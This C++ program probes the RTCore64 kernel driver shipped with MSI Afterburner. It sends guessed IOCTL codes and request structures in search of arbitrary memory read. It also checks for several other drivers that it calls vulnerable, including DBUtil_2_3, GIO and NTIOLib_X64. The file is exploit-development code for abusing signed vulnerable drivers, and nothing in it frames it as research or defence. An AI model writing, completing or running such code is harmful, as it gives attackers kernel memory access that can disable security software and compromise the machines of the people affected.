#include <Windows.h>
#include <iostream>
#include <vector>

// Test different RTCore64 IOCTL codes and data structures
struct RTCore64_Memory_Read {
    DWORD size;
    DWORD pid;
    ULONG64 address;
    VOID* buffer;
};

struct RTCore64_Memory_Write {
    DWORD size;
    DWORD pid;
    ULONG64 address;
    VOID* buffer;
};

// Alternative structure formats
struct RTCore64_Request_V1 {
    ULONG64 address;
    ULONG64 buffer;
    DWORD size;
    DWORD pid;
};

struct RTCore64_Request_V2 {
    DWORD pid;
    ULONG64 address;
    ULONG64 buffer;
    DWORD size;
    DWORD result;
};

// Common IOCTL codes to test
const DWORD IOCTL_CODES[] = {
    0x80002048, // Original assumption
    0x8000204C, // Original assumption  
    0x80002040,
    0x80002044,
    0x80002050,
    0x80002054,
    0x9C402084,
    0x9C402088,
    0x222008,
    0x222004
};

class RTCore64Tester {
private:
    HANDLE hDriver = INVALID_HANDLE_VALUE;
    DWORD testPID = 0;
    
public:
    bool Initialize() {
        hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        
        if (hDriver != INVALID_HANDLE_VALUE) {
            printf("[+] Connected to RTCore64 driver!\n");
            
            // Get current process PID for testing
            testPID = GetCurrentProcessId();
            printf("[+] Test PID: %d\n", testPID);
            
            return true;
        }
        
        printf("[-] Failed to connect to RTCore64!\n");
        return false;
    }
    
    ~RTCore64Tester() {
        if (hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(hDriver);
        }
    }
    
    void TestAllIOCTLs() {
        printf("\n=== Testing RTCore64 IOCTL Codes ===\n");
        
        // Test reading from a known good address (our own process memory)
        DWORD testValue = 0x12345678;
        ULONG64 testAddress = (ULONG64)&testValue;
        
        printf("Test address: 0x%llx\n", testAddress);
        printf("Expected value: 0x%x\n", testValue);
        
        for (int i = 0; i < sizeof(IOCTL_CODES) / sizeof(IOCTL_CODES[0]); i++) {
            DWORD ioctl = IOCTL_CODES[i];
            printf("\nTesting IOCTL: 0x%x\n", ioctl);
            
            // Test different data structure formats
            TestIOCTL_Format1(ioctl, testAddress, testPID);
            TestIOCTL_Format2(ioctl, testAddress, testPID);
            TestIOCTL_Format3(ioctl, testAddress, testPID);
        }
    }
    
    void TestIOCTL_Format1(DWORD ioctl, ULONG64 address, DWORD pid) {
        RTCore64_Memory_Read request = {};
        request.size = sizeof(DWORD);
        request.pid = pid;
        request.address = address;
        
        DWORD result = 0;
        request.buffer = &result;
        
        DWORD bytesReturned = 0;
        BOOL success = DeviceIoControl(
            hDriver,
            ioctl,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &bytesReturned,
            NULL
        );
        
        if (success && result != 0) {
            printf("  [+] Format1 SUCCESS! IOCTL: 0x%x, Result: 0x%x, Bytes: %d\n", ioctl, result, bytesReturned);
        } else {
            DWORD error = GetLastError();
            if (error != ERROR_INVALID_FUNCTION && error != ERROR_NOT_SUPPORTED) {
                printf("  [-] Format1 Error: %d\n", error);
            }
        }
    }
    
    void TestIOCTL_Format2(DWORD ioctl, ULONG64 address, DWORD pid) {
        RTCore64_Request_V1 request = {};
        request.address = address;
        request.size = sizeof(DWORD);
        request.pid = pid;
        
        DWORD result = 0;
        request.buffer = (ULONG64)&result;
        
        DWORD bytesReturned = 0;
        BOOL success = DeviceIoControl(
            hDriver,
            ioctl,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &bytesReturned,
            NULL
        );
        
        if (success && result != 0) {
            printf("  [+] Format2 SUCCESS! IOCTL: 0x%x, Result: 0x%x, Bytes: %d\n", ioctl, result, bytesReturned);
        }
    }
    
    void TestIOCTL_Format3(DWORD ioctl, ULONG64 address, DWORD pid) {
        RTCore64_Request_V2 request = {};
        request.pid = pid;
        request.address = address;
        request.size = sizeof(DWORD);
        
        DWORD result = 0;
        request.buffer = (ULONG64)&result;
        
        DWORD bytesReturned = 0;
        BOOL success = DeviceIoControl(
            hDriver,
            ioctl,
            &request,
            sizeof(request),
            &result,
            sizeof(result),
            &bytesReturned,
            NULL
        );
        
        if (success && result != 0) {
            printf("  [+] Format3 SUCCESS! IOCTL: 0x%x, Result: 0x%x, Bytes: %d\n", ioctl, result, bytesReturned);
        }
    }
    
    void TestBasicIOCTLs() {
        printf("\n=== Testing Basic RTCore64 Communication ===\n");
        
        // Test if RTCore64 responds to any basic IOCTLs
        DWORD bytesReturned = 0;
        
        // Test version/info IOCTL
        char buffer[256] = {};
        BOOL success = DeviceIoControl(
            hDriver,
            0x80002000, // Common info IOCTL
            NULL,
            0,
            buffer,
            sizeof(buffer),
            &bytesReturned,
            NULL
        );
        
        if (success) {
            printf("[+] Basic IOCTL 0x80002000 success! Bytes: %d\n", bytesReturned);
        } else {
            printf("[-] Basic IOCTL failed: %d\n", GetLastError());
        }
        
        // Test simple status IOCTL
        DWORD status = 0;
        success = DeviceIoControl(
            hDriver,
            0x80002004,
            NULL,
            0,
            &status,
            sizeof(status),
            &bytesReturned,
            NULL
        );
        
        if (success) {
            printf("[+] Status IOCTL success! Status: 0x%x, Bytes: %d\n", status, bytesReturned);
        }
    }
    
    void TestAlternativeDrivers() {
        printf("\n=== Testing Alternative Vulnerable Drivers ===\n");
        
        const wchar_t* drivers[] = {
            L"\\\\.\\NTIOLib_X64",
            L"\\\\.\\EthDiag", 
            L"\\\\.\\GIO",
            L"\\\\.\\DBUtil_2_3",
            L"\\\\.\\ASUS_WinFlash"
        };
        
        for (int i = 0; i < sizeof(drivers) / sizeof(drivers[0]); i++) {
            HANDLE hTest = CreateFileW(drivers[i], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            
            if (hTest != INVALID_HANDLE_VALUE) {
                printf("[+] Alternative driver found: %ws\n", drivers[i]);
                CloseHandle(hTest);
            } else {
                printf("[-] Driver not found: %ws\n", drivers[i]);
            }
        }
    }
};

int main() {
    printf("=== RTCore64 Direct Testing ===\n\n");
    
    RTCore64Tester tester;
    
    if (!tester.Initialize()) {
        printf("[-] Failed to initialize RTCore64!\n");
        printf("💡 Make sure MSI Afterburner is installed and running\n");
        getchar();
        return 1;
    }
    
    // Test basic communication first
    tester.TestBasicIOCTLs();
    
    // Test all possible memory access IOCTLs
    tester.TestAllIOCTLs();
    
    // Check for alternative drivers
    tester.TestAlternativeDrivers();
    
    printf("\n=== Testing Complete ===\n");
    printf("💡 If no memory access IOCTLs worked, RTCore64 might not support arbitrary memory access\n");
    printf("💡 In that case, we may need to use a different vulnerable driver\n");
    
    getchar();
    return 0;
} 